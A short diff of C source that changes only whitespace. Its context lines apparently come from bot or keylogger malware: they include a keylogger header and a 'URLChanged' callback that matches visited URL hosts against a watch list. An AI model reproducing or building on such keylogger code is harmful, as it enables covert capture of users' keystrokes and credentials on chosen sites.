@@ -3,7 +3,7 @@
 
  #ifdef CCH
 //===================================================================
-
+     
 
 #include "GetApi.h"
 #include "KeyLogSystems.h"
@@ -15,7 +15,7 @@
 #include "cc.h"
 
 
-//#include "BotDebug.h"
+//#include "BotDebug.h" 
 
 namespace DBGCC
 {
@@ -76,7 +76,7 @@ static void WINAPI URLChanged(PKeyLogger Logger, DWORD EventID, LPVOID Data)
 			UrlKeys* uk = (UrlKeys*)List::GetItem( listData, i );
 			if( m_lstrcmp( uk->url, UR.Host ) == 0 )
 			{
-				currData = uk;
+				currData = uk; 
 				break;
 			}
 		}
